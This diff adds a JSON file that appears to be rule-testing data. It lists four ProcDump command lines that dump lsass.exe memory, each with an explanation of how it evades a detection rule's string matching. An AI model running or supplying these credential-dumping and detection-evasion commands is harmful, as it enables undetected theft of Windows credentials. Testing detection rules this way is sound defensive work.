@@ -1,0 +1,18 @@
+[
+  {
+    "output": "procdump.exe -ma 648",
+    "explanation": "ProcDump can dump memory using a Process ID (PID) instead of a process name. Supplying the PID of lsass.exe (e.g., 648) completely omits the ' ls' string from the command line, bypassing the 'selection_process' condition."
+  },
+  {
+    "output": "procdump.exe -ma C:\\Windows\\System32\\lsass.exe",
+    "explanation": "The rule explicitly checks for a space preceding 'ls' (' ls'). By providing the absolute path to the target executable, the command line contains '\\lsass.exe' instead, which evades the specific space requirement in the 'selection_process' condition."
+  },
+  {
+    "output": "procdump.exe \"-ma\" lsass.exe",
+    "explanation": "The rule looks for the exact string ' -ma ' with leading and trailing spaces. Wrapping the parameter in double quotes bypasses the 'selection_flags' string match while still being processed correctly by the Windows command line parser."
+  },
+  {
+    "output": "procdump.exe lsass.exe -ma",
+    "explanation": "By placing the '-ma' flag at the very end of the command line, it lacks a trailing space. Since the rule explicitly looks for ' -ma ' (with a trailing space), it will fail to match."
+  }
+]
